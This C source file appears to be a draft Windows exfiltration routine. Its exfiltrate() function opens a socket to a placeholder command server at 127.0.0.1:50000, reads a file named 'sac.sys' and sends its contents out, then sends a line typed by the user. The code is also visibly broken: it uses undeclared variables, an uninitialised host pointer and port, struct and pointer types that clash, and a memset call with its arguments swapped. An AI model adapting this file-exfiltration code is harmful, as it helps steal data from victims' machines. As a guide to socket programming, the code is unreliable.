#define __STDC_WANT_LIB_EXT1__ 1

#include <stdio.h>
#include <io.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define HOST_NAME "127.0.0.1"
#define PORT_NUMBER "50000"
#define FILE_NAME "sac.sys"
#define BUFFER_SIZE 512

void exfiltrate()
{
	//----------------------------------------------
	// declare variables

	WSADATA wsaData;
	int wsa_rtn;

	int sockfd, port;
	struct sockaddr_in *srv_addr;
	struct hostent *cmdserver;
	DWORD err;
	FILE *fd;
	errno_t error;

	//buffer to read
	char buffer[BUFFER_SIZE];

	//----------------------------------------------
	// initialization

	wsa_rtn = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsa_rtn != 0)
	{
		printf("WSAStartup failure: %d (No usable Winsock DLL)\n", wsa_rtn);
		// do alt action or exit
		exit(-1);
	}

	//port = PORT_NUMBER;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if (sockfd < 0)
		printf("Failed to init socket file descriptor");

	// await for updates to GetAddrInfoW()
	//cmdserver = gethostbyname(HOST_NAME);

	struct addrinfo hints, *res, *p;
	int stat;
	int sock;

	// Setup the hints address info structure
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET; // IPv4
	hints.ai_socktype = SOCK_STREAM; // TCP-based
	hints.ai_protocol = IPPROTO_TCP;

	if ((stat = getaddrinfo(HOST_NAME, PORT_NUMBER, &hints, &res)) != 0)
	{
		printf("getaddrinfo failed: %s\n", gai_strerror(stat));
		WSACleanup();
		// do alt action or exit
		exit(-1);
	}

	for (p = res; p != NULL; p = p -> ai_next)
	{
		void *addr;
		srv_addr = (struct sockaddr_in *)p -> ai_addr;
		addr = &(remote->sin_addr);

		// Convert IP to string
		inet_ntop(p->ai_family, addr, ip_addr, sizeof(ip_addr));

		printf("%s\n", ip_addr);
	}

	addr.S_un = ((struct sockaddr_in *)(res->ai_addr))->sin_addr.S_un;

	//printf("ip address : %s\n", inet_ntoa(addr));



	if (cmdserver == NULL)
	{
		err = WSAGetLastError();
		if (err != 0)
			printf("gethostbyname error: %ld\n", err);
		// do alt action or exit
	}

	memset((char *)&srv_addr, 0, sizeof(srv_addr));
	srv_addr.sin_family = AF_INET;
	memcpy((char *)&srv_addr.sin_addr.s_addr, (char *)cmdserver -> h_addr, cmdserver -> h_length);
	srv_addr.sin_port = htons(port);
	if (connect(sockfd, (struct sockaddr *) &srv_addr, sizeof(srv_addr)) < 0)
	{
		printf("connection failed");
		// do alt action or exit
		exit(-1);
	}

	//----------------------------------------------
	// unit test: send file
	error = fopen_s(&fd, FILE_NAME, "r+");
	int bytes_read;
	if (error != 0)
	{
		printf("error opening file");
		// do alt action or exit
	}
	else
	{
		while (!feof(fd))
		{
			if ((bytes_read = fread(&buffer, 1, BUFFER_SIZE, fd)) > 0)
				send(sockfd, buffer, bytes_read, 0);
			else
				break;
		}
	}
	fclose(fd);

	//----------------------------------------------
	// unit test: send text
	printf("Text: ");
	memset(buffer, sizeof(buffer), 512);
	fgets(buffer, 511, stdin);
	if (_write(sockfd, buffer, strlen(buffer)) < 0)
		printf("write socket failure");

	//----------------------------------------------
	// unit test: read text
	memset(buffer, 0, 512);
	if (_read(sockfd, buffer, 511) < 0)
		printf("read socket failure");
	printf("%s\n", buffer);

	//----------------------------------------------
	// close up
	_close(sockfd);
}

int main(int argc, char *argv[])
{
	exfiltrate();
	return 0;
}